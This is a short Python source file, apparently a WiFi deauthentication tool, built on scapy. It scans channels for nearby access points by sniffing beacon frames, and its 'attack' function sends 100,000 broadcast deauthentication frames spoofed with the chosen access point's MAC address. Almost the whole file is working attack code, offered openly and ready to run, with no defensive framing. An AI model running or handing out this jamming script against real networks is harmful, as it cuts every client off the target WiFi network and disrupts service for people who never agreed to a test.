from time import sleep
from typing import Sequence
from scapy.all import AsyncSniffer, Dot11, Dot11Deauth, RadioTap, sendp


from access_point import AccessPoint
from network_interface import hop_channel


def detect_networks(interface: str, channels: Sequence[int]):
    """
    Detect WiFi accees points
    """
    print("Scanning for nearby WiFi networks...")
    acces_points = {}
    
    for channel in channels:
        hop_channel(interface, channel)
        packets = _sniff_wifi_beacons(interface)
        for packet in packets:
            acces_points[packet.addr2] = AccessPoint(mac=packet.addr2, ssid=packet.info.decode('utf-8'), channel=channel)
    access_points = list(acces_points.values())
    access_points.sort(key=lambda n : n.ssid)
    return access_points


def _sniff_wifi_beacons(interface):
    """
    Sniff for 802.11 beacon frames
    """
    sniffer = AsyncSniffer(iface=interface, filter="wlan type mgt subtype beacon", store=True)
    sniffer.start()
    sleep(2)
    sniffer.stop()
    return sniffer.results


def attack(interface: str, access_point: AccessPoint):
    """
    Send 802.11 Deauthentication frame to acces point
    """
    hop_channel(interface, access_point.channel)
    target_device = "FF:FF:FF:FF:FF:FF"
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=target_device, addr2=access_point.mac, addr3=access_point.mac)/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=100000, iface=interface, verbose=1)
